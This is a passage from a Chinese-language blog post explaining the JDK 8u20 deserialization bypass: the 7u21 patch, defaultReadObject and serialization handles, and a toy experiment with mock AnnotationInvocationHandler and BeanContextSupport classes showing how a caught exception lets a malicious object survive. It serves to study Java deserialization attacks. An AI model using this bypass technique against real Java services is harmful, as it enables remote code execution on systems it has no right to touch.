class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 改之前</span></span><br><span class="line">AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    annotationType = AnnotationType.getInstance(type);</span><br><span class="line">&#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">    <span class="comment">// Class is no longer an annotation type; all bets are off</span></span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改之后</span></span><br><span class="line">AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    annotationType = AnnotationType.getInstance(type);</span><br><span class="line">&#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">    <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意<strong>AnnotationInvocationHandler 这个对象是先被成功还原</strong>，然后再抛出的异常。</p><h3 id="readObject-amp-defaultReadObject"><a href="#readObject-amp-defaultReadObject" class="headerlink" title="readObject &amp; defaultReadObject"></a>readObject &amp; defaultReadObject</h3><p>这里简单提一下这两个序列化流程中的重点函数：</p><ul><li><p><strong>defaultReadObject</strong></p><p>用来执行<strong>默认</strong>的反序列化流程。简单来说就是<strong>将非静态、非<code>transient</code>修饰的代码进行反序列化</strong>。</p></li><li><p><strong>readObject</strong></p><p>如果对象自己实现了readObject方法，那么就会执行对象自身的readObject方法。</p></li></ul><p>参考<a href="https://buaq.net/go-78144.html" target="_blank" rel="noopener">这篇</a></p><blockquote><p>根据 oracle 官方定义的 Java 中可序列化对象流的原则:</p><p>如果一个类中定义了<code>readObject</code>方法，那么这个方法将会取代默认序列化机制中的方法读取对象的状态，</p><p><strong>可选的信息</strong>可依靠这些方法读取，而<strong>必选数据部分</strong>要依赖<code>defaultReadObject</code>方法读取；</p></blockquote><p>我们看AnnotationInvocationHandler的readObject方法。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210715163322257.png" alt="image-20210715163322257"></p><p>第一行就调用了<code>defaultReadObject</code>方法，该方法主要就是从字节流中读取对象的<strong>字段值</strong>，它可以从字节流中按照定义对象的<strong>类描述符</strong>以及定义的顺序读取<strong>字段的名称</strong>和<strong>类型信息</strong>。这些值会通过匹配当前类的字段名称的方式来赋予，如果当前这个对象中的某个字段并没有在字节流中出现，则这些字段会使用类中定义的默认值。</p><p><strong>如果这个值出现在字节流中，但是并不属于对象，则抛弃该值</strong>。</p><p><strong>如果这个值是一个对象的话，那么会为这个值分配一个Handle</strong></p><p>在利用<code>defaultReadObject()</code>还原了一部分对象的值后，最近进行<code>AnnotationType.getInstance(type)</code>判断，如果传入的 type 不是<code>AnnotationType</code>类型，那么抛出异常。</p><p>也就是说，实际上在<code>jdk7u21</code>漏洞中，我们传入的<code>AnnotationInvocationHandler</code>对象在异常被抛出前，已经从序列化数据中被还原出来。换句话说就是我们把恶意的种子种到了运行对象中，但是因为出现异常导致该种子没法生长，只要我们解决了这个异常，那么就可以重新达到我们的目的。</p><p><strong>这也就是<code>jdk8u20</code>漏洞的原理——绕过异常。</strong></p><h3 id="有趣的Try-amp-Catch-amp-Throw"><a href="#有趣的Try-amp-Catch-amp-Throw" class="headerlink" title="有趣的Try &amp; Catch &amp; Throw"></a>有趣的Try &amp; Catch &amp; Throw</h3><p>总结panda师傅的实验：</p><p>假设a方法有try-catch-throw，b方法只有try-catch: 以下 <code>-&gt;</code>表示调用</p><p>分类讨论：</p><ul><li>如果<code>a -&gt;b</code>，如果b中出现异常，由于没有throw，并不会影响a后续的执行流程。</li><li>如果<code>b-&gt;a</code>，如果a中出现异常，a会将异常throw给上一级的b，被b方法catch住，b方法中断，b后续就不会再继续执行了。</li></ul><h3 id="什么是反序列化句柄Handle"><a href="#什么是反序列化句柄Handle" class="headerlink" title="什么是反序列化句柄Handle"></a>什么是反序列化句柄Handle</h3><p>Handle值是每一个对象自身的一个字段。</p><p>在序列化数据中，存在的对象有null、new objects、classes、arrays、strings、back references等，这些对象在序列化结构中都有对应的描述信息，并且每一个写入字节流的对象都会被赋予引用<code>Handle</code>，并且这个引用<code>Handle</code>可以反向引用该对象（使用<code>TC_REFERENCE</code>结构，引用前面handle的值），引用<code>Handle</code>会从<code>0x7E0000</code>开始进行顺序赋值并且自动自增，一旦字节流发生了重置则该引用Handle会重新从<code>0x7E0000</code>开始。</p><p>如果你连续两次序列化同一个对象，那么第二次序列化写入的就是第一个对象的handle。</p><p>可以发现，因为我们两次 writeObject 写入的其实是同一个对象，所以 Date 对象的数据只在第一次 writeObject 的时候被真实写入了。而第二次 writeObject 时，写入的是一个 TC_REFERENCE 的结构，随后跟了一个4 字节的 Int 值，值为 0x00 7e 00 01。这是什么意思呢？意思就是第二个对象引用的其实是 handle 为 0x00 7e 00 01 的那个对象。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521192832251.png" alt="image-20210521192832251"></p><p>在反序列化进行读取的时候，因为之前进行了两次 writeObject，所以为了读取，也应该进行两次 readObject：</p><ol><li>第一次 readObject 将会读取 TC_OBJECT 表示的第 1 个对象，发现是 Date 类型的对象，然后从流中读取此对象成员的值并还原。并为此 Date 对象分配一个值为 0x00 7e 00 01 的 handle。</li><li>第二个 readObject 会读取到 TC_REFERENCE，说明是一个引用，引用的是刚才还原出来的那个 Date 对象，此时将直接返回之前那个 Date 对象的引用。</li></ol><p>在<a href="https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/" target="_blank" rel="noopener">反序列化流程梳理</a>这篇，在最开始的switch-case时候，如果是一个TC_REFERENCE，调用的是readHandle：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">       <span class="keyword">return</span> readHandle(unshared);</span><br></pre></td></tr></table></figure><p>跟进去看<code>readHandle</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Reads in object handle, sets passHandle to the read handle, and returns</span></span><br><span class="line"><span class="comment"> * object associated with the handle.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readHandle</span><span class="params">(<span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (bin.readByte() != TC_REFERENCE) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">    &#125;</span><br><span class="line">    passHandle = bin.readInt() - baseWireHandle;</span><br><span class="line">    <span class="keyword">if</span> (passHandle &lt; <span class="number">0</span> || passHandle &gt;= handles.size()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(</span><br><span class="line">            String.format(<span class="string">"invalid handle value: %08X"</span>, passHandle +</span><br><span class="line">            baseWireHandle));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (unshared) &#123;</span><br><span class="line">        <span class="comment">// REMIND: what type of exception to throw here?</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(</span><br><span class="line">            <span class="string">"cannot read back reference as unshared"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object obj = handles.lookupObject(passHandle);</span><br><span class="line">    <span class="keyword">if</span> (obj == unsharedMarker) &#123;</span><br><span class="line">        <span class="comment">// REMIND: what type of exception to throw here?</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(</span><br><span class="line">            <span class="string">"cannot read back reference to unshared object"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    filterCheck(<span class="keyword">null</span>, -<span class="number">1</span>);       <span class="comment">// just a check for number of references, depth, no class</span></span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这方法首先读取TC_REFERENCE字段，接下来把读取的Handle的值传递个passHandle变量</p><p>来到<code>Object obj = handles.lookupObject(passHandle);</code> 跟进去看源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Looks up and returns object associated with the given handle.</span></span><br><span class="line"><span class="comment"> * Returns null if the given handle is NULL_HANDLE, or if it has an</span></span><br><span class="line"><span class="comment"> * associated ClassNotFoundException.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">Object <span class="title">lookupObject</span><span class="params">(<span class="keyword">int</span> handle)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (handle != NULL_HANDLE &amp;&amp;</span><br><span class="line">            status[handle] != STATUS_EXCEPTION) ?</span><br><span class="line">        entries[handle] : <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>lookupObject判断如果引用的<code>handle</code>不为空、并且没有关联的<code>ClassNotFoundException</code>（<code>status[handle] != STATUS_EXCEPTION</code>），那么就返回给定<code>handle</code>的引用对象。</p><p>所以这里的逻辑就是，<strong>一旦在反序列化过程中发现有TC_REFERENCE的时候，会尝试还原引用的handle对象</strong>。</p><h3 id="如何插入数据？"><a href="#如何插入数据？" class="headerlink" title="如何插入数据？"></a>如何插入数据？</h3><p>思考一个问题，如果我们在序列化的过程中，再向流内写东西，会发生什么？</p><p>做个实验：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Twice</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">100L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream oos)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        oos.defaultWriteObject();</span><br><span class="line">        oos.writeObject(<span class="string">"ORANGE"</span>);</span><br><span class="line">        oos.writeUTF(<span class="string">"This is a sentence!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Twice t = <span class="keyword">new</span> Twice();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"twice1.ser"</span>));</span><br><span class="line">        oos.writeObject(t);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下twice2.ser:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar SerializationDumper.jar -r twice1.ser</span><br><span class="line"></span><br><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">    TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">      className</span><br><span class="line">        Length - <span class="number">20</span> - <span class="number">0x00</span> <span class="number">14</span></span><br><span class="line">        Value - com.fxc.serial.Twice - <span class="number">0x636f6d2e6678632e73657269616c2e5477696365</span></span><br><span class="line">      serialVersionUID - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">64</span></span><br><span class="line">      newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">00</span></span><br><span class="line">      classDescFlags - <span class="number">0x03</span> - SC_WRITE_METHOD | SC_SERIALIZABLE</span><br><span class="line">      fieldCount - <span class="number">0</span> - <span class="number">0x00</span> <span class="number">00</span></span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - <span class="number">0x70</span></span><br><span class="line">    newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">01</span></span><br><span class="line">    classdata</span><br><span class="line">      com.fxc.serial.Twice</span><br><span class="line">        values</span><br><span class="line">        objectAnnotation</span><br><span class="line">          TC_STRING - <span class="number">0x74</span></span><br><span class="line">            newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">02</span></span><br><span class="line">            Length - <span class="number">6</span> - <span class="number">0x00</span> <span class="number">06</span></span><br><span class="line">            Value - ORANGE - <span class="number">0x4f52414e4745</span></span><br><span class="line">          TC_BLOCKDATA - <span class="number">0x77</span></span><br><span class="line">            Length - <span class="number">21</span> - <span class="number">0x15</span></span><br><span class="line">            Contents - <span class="number">0x00135468697320697320612073656e74656e636521</span></span><br><span class="line">          TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br></pre></td></tr></table></figure><p>可以发现：</p><ul><li>首先<code>classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE</code>有注明，对象有实现writeObject方法</li><li>其次在classdata下面出现了<code>objectAnnotation</code>字段，两个对象<ul><li>一个是我们写入的String对象“ORANGE”</li><li>第二个是一个BlockData “This is a sentence!” </li></ul></li></ul><p>TC_ENDBLOCKDATA标志着对象结束</p><p>现在我们当然想在writeObject的时候就插入恶意数据</p><p>简单粗暴，一切都是二进制，<strong>我们直接手动写入一段<code>objectAnnotation</code>就可以了</strong>。</p><p>先看一个小例子，复盘一下<a href>panda</a>师傅的实验。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">10L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> zero;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AnnotationInvocationHandler</span><span class="params">(<span class="keyword">int</span> zero)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.zero = zero;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Process shell = Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream input)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        input.defaultReadObject();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.zero==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">double</span> result = <span class="number">1</span>/<span class="keyword">this</span>.zero;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"Hack !!!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"your number is error!!!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BeanContextSupport</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">20L</span>;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream input)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        input.defaultReadObject();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            input.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个类：A有throw，B没有throw</p><p>如果我们反序列化A，肯定会报错。</p><p>因为A的readObject首先会执行<code>input.defaultReadObject()</code>，这句话其实的意思就是从序列化流里面取出一个对象，然后执行他的默认序列化，就是给字段赋值。</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210717164640363.png" alt="image-20210717164640363" style="zoom:50%;"><p>这里<code>this</code>其实就是<code>AnnotationInvocationHandler</code>对象了，当我们执行完<code>input.defaultReadObject</code>的时候，其实zero字段已经被赋值为0了。</p><p>所以会进入if，除数为0，引发异常，<strong>但是我们的AnnotationInvocationHandler对象已经序列化成功了</strong>。</p><p>我们看一下序列化好的payload1文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - 0x73</span><br><span class="line">    TC_CLASSDESC - 0x72</span><br><span class="line">      className</span><br><span class="line">        Length - 49 - 0x00 31</span><br><span class="line">        Value - com.fxc.bautwentycase.AnnotationInvocationHandler - 0x636f6d2e6678632e6261757477656e7479636173652e416e6e6f746174696f6e496e766f636174696f6e48616e646c6572</span><br><span class="line">      serialVersionUID - 0x00 00 00 00 00 00 00 0a</span><br><span class="line">      newHandle 0x00 7e 00 00</span><br><span class="line">      classDescFlags - 0x02 - SC_SERIALIZABLE</span><br><span class="line">      fieldCount - 1 - 0x00 01</span><br><span class="line">      Fields</span><br><span class="line">        0:</span><br><span class="line">          Int - I - 0x49</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 4 - 0x00 04</span><br><span class="line">            Value - zero - 0x7a65726f</span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - 0x78</span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - 0x70</span><br><span class="line">    newHandle 0x00 7e 00 01</span><br><span class="line">    classdata</span><br><span class="line">      com.fxc.bautwentycase.AnnotationInvocationHandler</span><br><span class="line">        values</span><br><span class="line">          zero</span><br><span class="line">            (int)0 - 0x00 00 00 00</span><br></pre></td></tr></table></figure><p>我们要知道为什么7u21修复之后就失效了？</p><p>是因为<strong>在catch块中，修复前没有throw，修复之后多了throw！！！！</strong></p><p>也就是说，<strong>修复之后，异常被throw，进程被终止掉，我们的反序列化对象也被销毁掉，导致反序列化失败</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 改之前</span></span><br><span class="line">AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    annotationType = AnnotationType.getInstance(type);</span><br><span class="line">&#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">    <span class="comment">// Class is no longer an annotation type; all bets are off</span></span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改之后</span></span><br><span class="line">AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    annotationType = AnnotationType.getInstance(type);</span><br><span class="line">&#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">    <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们希望的是就算有异常，不要有throw，catch就好了，这样可以保证我们的反序列化对象还是存在的。</p><p>所以来到上一个小实验，如果我们希望绕过<code>if(this.zero==0){</code>这个判断：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">10L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> zero;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AnnotationInvocationHandler</span><span class="params">(<span class="keyword">int</span> zero)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.zero = zero;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Process shell = Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream input)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        input.defaultReadObject();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.zero==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">double</span> result = <span class="number">1</span>/<span class="keyword">this</span>.zero;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"Hack !!!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"your number is error!!!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在换一个思路，A类的readObject一定会throw一个异常，我们能做的就是希望这个exception不要影响我们对象的序列化进程。</p><p>想到之前的分析：</p><p><strong>我们可以在A的throw外面再套一个<code>try-catch</code>：</strong></p><p>也就是说，<strong>你A可以随便throw Exception，我只要外面catch住就可以了，进程不受影响。</strong></p><p>这也是为什么B类存在的原因。</p><p>重点看B：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BeanContextSupport</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">20L</span>;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream input)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        input.defaultReadObject();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            input.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 